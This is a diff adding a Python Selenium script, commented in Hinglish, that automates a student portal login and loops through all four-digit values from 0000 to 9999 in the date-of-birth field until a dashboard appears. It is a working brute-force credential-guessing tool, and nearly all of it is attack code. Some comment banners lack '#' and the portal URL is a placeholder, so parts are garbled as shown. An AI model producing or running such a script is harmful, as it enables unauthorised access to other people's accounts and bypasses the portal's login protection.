@@ -1,0 +1,286 @@
+
+import os
+import time
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from webdriver_manager.chrome import ChromeDriverManager
+
+  =========================================================================
+     👇 APNA FUNCTION: Naya DOB dene ke liye (0000 se 9999 tak) 👇
+ =========================================================================
+demo_dobs = [f"{s:04d}" for s in range(10000)]
+
+def get_next_dob():
+    """Yeh function har baar agli DOB return karega."""
+    if demo_dobs:
+        return demo_dobs.pop(0)
+    return None
+
+ =========================================================================
+  SARI BUTTONS KE FUNCTIONS (Inhe lagane par KABHI ERROR NAHI AAYEGA)
+=========================================================================
+
+def click_student(driver):
+    """'Student' radio button ya label select karta hai"""
+    try:
+        el = driver.find_element(
+            By.XPATH,
+            "//input[@type='radio' and contains(translate(@value, 'STUDENT', 'student'), 'student')] | "
+            "//input[@type='radio' and contains(translate(@id, 'STUDENT', 'student'), 'student')] | "
+            "//label[contains(translate(text(), 'STUDENT', 'student'), 'student')] | "
+            "//button[contains(translate(text(), 'STUDENT', 'student'), 'student')] | "
+            "//a[contains(translate(text(), 'STUDENT', 'student'), 'student')]"
+        )
+        driver.execute_script("arguments[0].click();", el)
+        print("🎯 'Student' select ho gaya.")
+        return True
+    except Exception:
+        return False
+
+def click_yes(driver):
+    """Popup ya Alert me 'YES' choose karta hai"""
+    try:
+        alert = driver.switch_to.alert
+        alert.accept()
+        print("🎯 Browser Alert par 'YES' dabaya.")
+        return True
+    except Exception:
+        pass
+    try:
+        el = driver.find_element(
+            By.XPATH,
+            "//button[translate(normalize-space(text()), 'YES', 'yes')='yes'] | "
+            "//button[contains(translate(text(), 'YES', 'yes'), 'yes')] | "
+            "//input[(@type='button' or @type='submit') and translate(normalize-space(@value), 'YES', 'yes')='yes'] | "
+            "//a[translate(normalize-space(text()), 'YES', 'yes')='yes']"
+        )
+        driver.execute_script("arguments[0].click();", el)
+        print("🎯 Popup me 'YES' button click ho gaya.")
+        return True
+    except Exception:
+        return False
+
+def click_no(driver):
+    """Popup ya Alert me 'NO' choose karta hai"""
+    try:
+        alert = driver.switch_to.alert
+        alert.dismiss()
+        print("🎯 Browser Alert par 'NO' dabaya.")
+        return True
+    except Exception:
+        pass
+    try:
+        el = driver.find_element(
+            By.XPATH,
+            "//button[translate(normalize-space(text()), 'NO', 'no')='no'] | "
+            "//button[contains(translate(text(), 'NO', 'no'), 'no')] | "
+            "//input[(@type='button' or @type='submit') and translate(normalize-space(@value), 'NO', 'no')='no'] | "
+            "//a[translate(normalize-space(text()), 'NO', 'no')='no'] | "
+            "//button[contains(@class, 'cancel') or contains(@class, 'swal2-cancel')]"
+        )
+        driver.execute_script("arguments[0].click();", el)
+        print("🎯 Popup me 'NO' button click ho gaya.")
+        return True
+    except Exception:
+        return False
+
+def click_ok(driver):
+    """Popup ya Alert par 'OK' dabata hai"""
+    try:
+        alert = driver.switch_to.alert
+        alert.accept()
+        print("🎯 Browser Alert par 'OK' dabaya.")
+        return True
+    except Exception:
+        pass
+    try:
+        el = driver.find_element(
+            By.XPATH,
+            "//button[translate(normalize-space(text()), 'OK', 'ok')='ok'] | "
+            "//button[contains(translate(text(), 'OK', 'ok'), 'ok')] | "
+            "//input[(@type='button' or @type='submit') and translate(normalize-space(@value), 'OK', 'ok')='ok'] | "
+            "//button[contains(@class, 'confirm') or contains(@class, 'swal2-confirm')]"
+        )
+        driver.execute_script("arguments[0].click();", el)
+        print("🎯 Popup me 'OK' button click ho gaya.")
+        return True
+    except Exception:
+        return False
+
+def click_login(driver):
+    """'Login' / 'Sign In' button dabata hai"""
+    try:
+        el = driver.find_element(
+            By.XPATH,
+            "//button[contains(translate(text(), 'LOGIN', 'login'), 'login')] | "
+            "//button[contains(translate(text(), 'SIGN IN', 'sign in'), 'sign in')] | "
+            "//input[(@type='submit' or @type='button') and contains(translate(@value, 'LOGIN', 'login'), 'login')] | "
+            "//input[contains(@id, 'btnLogin') or contains(@id, 'Login')] | "
+            "//button[contains(@id, 'btnLogin') or contains(@id, 'Login')] | "
+            "//button[@type='submit'] | //input[@type='submit']"
+        )
+        driver.execute_script("arguments[0].click();", el)
+        return True
+    except Exception:
+        return False
+
+def click_submit(driver):
+    """'Submit' button dabata hai"""
+    try:
+        el = driver.find_element(
+            By.XPATH,
+            "//button[contains(translate(text(), 'SUBMIT', 'submit'), 'submit')] | "
+            "//input[(@type='submit' or @type='button') and contains(translate(@value, 'SUBMIT', 'submit'), 'submit')] | "
+            "//input[contains(@id, 'btnSubmit') or contains(@id, 'Submit')] | "
+            "//button[contains(@id, 'btnSubmit') or contains(@id, 'Submit')] | "
+            "//button[@type='submit'] | //input[@type='submit']"
+        )
+        driver.execute_script("arguments[0].click();", el)
+        return True
+    except Exception:
+        return False
+
+def click_cancel(driver):
+    """'Cancel' / 'Close' (X) button dabata hai"""
+    try:
+        el = driver.find_element(
+            By.XPATH,
+            "//button[contains(translate(text(), 'CANCEL', 'cancel'), 'cancel')] | "
+            "//button[contains(translate(text(), 'CLOSE', 'close'), 'close')] | "
+            "//button[contains(@class, 'close') or @aria-label='Close'] | "
+            "//input[(@type='button' or @type='submit') and contains(translate(@value, 'CANCEL', 'cancel'), 'cancel')]"
+        )
+        driver.execute_script("arguments[0].click();", el)
+        print("🎯 'Cancel/Close' click ho gaya.")
+        return True
+    except Exception:
+        return False
+
+def click_next(driver):
+    """'Next' / 'Continue' button dabata hai"""
+    try:
+        el = driver.find_element(
+            By.XPATH,
+            "//button[contains(translate(text(), 'NEXT', 'next'), 'next')] | "
+            "//button[contains(translate(text(), 'CONTINUE', 'continue'), 'continue')] | "
+            "//input[(@type='button' or @type='submit') and (contains(translate(@value, 'NEXT', 'next'), 'next') or contains(translate(@value, 'CONTINUE', 'continue'), 'continue'))] | "
+            "//a[contains(translate(text(), 'NEXT', 'next'), 'next') or contains(translate(text(), 'CONTINUE', 'continue'), 'continue')]"
+        )
+        driver.execute_script("arguments[0].click();", el)
+        print("🎯 'Next/Continue' click ho gaya.")
+        return True
+    except Exception:
+        return False
+
+ =========================================================================
+                              CONFIGURATION
+ =========================================================================
+portal_url = "http://😕 apni file ka name liikh dekh kiya rha he "
+local_html_file = f"file://{os.path.abspath('index.html')}"
+
+enrollment_no = input("Apna Enrollment Number daalein (Optional): ").strip()
+dob = input("Apna DOB daalein: ").strip()
+
+options = webdriver.ChromeOptions()
+options.add_argument("--start-maximized")
+driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
+
+def check_login_status(driver, timeout=1.5):
+    """Super fast check: 0.05s intervals me check karega"""
+    start_time = time.time()
+    while time.time() - start_time < timeout:
+        # 1. Alert check (Galat DOB par turant pakad lega)
+        try:
+            alert = driver.switch_to.alert
+            alert_text = alert.text
+            alert.accept()
+            return False, alert_text
+        except Exception:
+            pass
+
+        # 2. Dashboard open hone par
+        if "dashboard" in driver.current_url.lower():
+            return True, "Dashboard detected"
+
+        time.sleep(0.05)
+
+    return False, "Timeout"
+
+try:
+    print(f"\nWebsite open ho rahi hai: {portal_url}")
+    try:
+        driver.get(portal_url)
+    except Exception:
+        driver.get(local_html_file)
+
+    wait = WebDriverWait(driver, 5)
+
+     -------------------------------------------------------------
+       ONE-TIME SETUP (Inhe lagane par kabhi error nahi aayega)
+     -------------------------------------------------------------
+    # 1. Student select karna ho:
+    click_student(driver)
+
+    # 2. Popup me YES dabana ho:
+    click_yes(driver)
+
+    # 3. Popup me NO / OK / CANCEL dabana ho toh bas un-comment karein:
+    # click_no(driver)
+    # click_ok(driver)
+    # click_cancel(driver)
+    # click_next(driver)
+
+    # 4. Enrollment Number Fill (Agar page par ho toh):
+    try:
+        enroll_input = driver.find_element(
+            By.XPATH, "//input[contains(@id, 'txtEnrollment') or contains(@placeholder, 'Enrollment')][1]"
+        )
+        enroll_input.clear()
+        enroll_input.send_keys(enrollment_no)
+    except Exception:
+        pass
+
+    # 5. DOB field locate karna:
+    dob_field = wait.until(EC.visibility_of_element_located((
+        By.XPATH, "//input[contains(@id, 'txtDOB') or @type='password' or @type='text'][1]"
+    )))
+
+     -------------------------------------------------------------
+                       LIGHTNING FAST RETRY LOOP
+     -------------------------------------------------------------
+    while True:
+        # Fast Clear & Enter DOB
+        dob_field.send_keys(Keys.COMMAND + "a")
+        dob_field.send_keys(Keys.CONTROL + "a")
+        dob_field.send_keys(Keys.BACKSPACE)
+        dob_field.send_keys(dob)
+
+        # Login button click (Helper function se)
+        click_login(driver)
+
+        # Fast Status Check
+        is_success, msg = check_login_status(driver)
+        if is_success:
+            print("\n" + "=" * 50)
+            print(f"🎉 SUCCESS! Sahi DOB mila ({dob}), Login ho gaya!")
+            print("=" * 50)
+            break
+        else:
+            print(f"❌ Galat DOB: {dob}")
+            RETRY_DOB = get_next_dob()
+            if not RETRY_DOB:
+                print("Khatam: get_next_dob() ne koi DOB nahi diya.")
+                break
+            dob = str(RETRY_DOB).strip()
+
+except Exception as e:
+    print(f"\nError: {e}")
+
+finally:
+    print("\nBrowser band karne ke liye Enter dabayein...")
+    input()
+    driver.quit()
